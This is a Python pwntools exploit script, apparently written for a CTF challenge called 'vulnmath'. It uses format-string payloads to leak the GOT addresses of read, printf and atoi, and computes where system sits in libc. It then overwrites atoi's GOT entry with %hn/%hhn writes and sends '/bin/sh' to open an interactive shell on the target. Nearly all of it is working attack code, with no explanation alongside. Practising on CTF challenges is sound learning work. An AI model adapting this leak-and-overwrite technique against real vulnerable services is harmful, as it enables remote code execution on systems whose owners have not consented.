#!/usr/bin/env python2
from pwn import *
# from mypwntools import * # ~/workspace/tools/mypwntools/
import logging
import coloredlogs
import ctypes
import re
from LibcSearcher import LibcSearcher
# shellcodes['binsh32']
# shellcodes['binshx86_64']
# gethex(string)

coloredlogs.install()
log = logging.getLogger("Exploit")

#context.log_level = 'debug'
context.terminal = ['alacritty', '-e', 'sh', '-c']
context.arch='i386'

BINARY = "./vulnmath"
HOST, PORT = 'chal.tuctf.com', 30502
LIBC_PATH = '/usr/lib32/libc.so.6'

GDB_SETUP = """
set follow-fork-mode child
c
"""

if '--live' not in sys.argv:
    p = process(BINARY)
    if '--debug' in sys.argv:
        gdb.attach(p, GDB_SETUP)
else:
    LIBC_PATH = './libc.so.6'
    p = remote(HOST, PORT)

if LIBC_PATH:
    libc = ELF(LIBC_PATH)

binary = ELF(BINARY)

read_got = binary.symbols['got.read']
atoi_got = binary.symbols['got.atoi']
printf_got = binary.symbols['got.printf']
print(hex(read_got))

#glibc = ctypes.cdll.LoadLibrary(LIBC_PATH)
#glibc.srand(glibc.time(0))

#line = str(p.recvuntil("> "))
#equation = re.search('What is (.*)\?', line).group(1)
#payload = 'AAAABBBB.%6$x'
#p.sendline(payload)
libc_searcher = LibcSearcher()

line = p.recvuntil("> ")

payload = p32(read_got) + "eeee%6$seeee\x00"
p.sendline(payload)
line = str(p.recvuntil("> "))
read = u32(re.search('eeee(.*)eeee', line).group(1)[:4])

payload = p32(printf_got) + "eeee%6$seeee\x00"
p.sendline(payload)
line = str(p.recvuntil("> "))
printf = u32(re.search('eeee(.*)eeee', line).group(1)[:4])

payload = p32(atoi_got) + "eeee%6$seeee\x00"
p.sendline(payload)
line = str(p.recvuntil("> "))
atoi = u32(re.search('eeee(.*)eeee', line).group(1)[:4])

print('read: {}'.format(hex(read)))
print('printf: {}'.format(hex(printf)))
print('atoi: {}'.format(hex(atoi)))
libc_searcher.add_condition('read', read)
libc_searcher.add_condition('printf', printf)
libc_searcher.add_condition('atoi', atoi)

#libc_base = read - libc_searcher.dump('read')
system = read - libc.symbols['read'] + libc.symbols['system']
#system = libc_searcher.dump('system') + libc_base
print(hex(system))

val_1 = system & 0xffff
val_2 = (system & 0xff0000) >> 16
#print(hex(system))
#print(hex(val_1))
#print(hex(val_2))
payload = p32(atoi_got) + p32(atoi_got + 2) + '%{}c%6$hn%{}c%7$hhn'.format(val_1 - 8, val_2 - (val_1 & 0xff))

p.sendline(payload)
p.recvuntil('> ')

p.sendline('/bin/sh')
p.interactive()

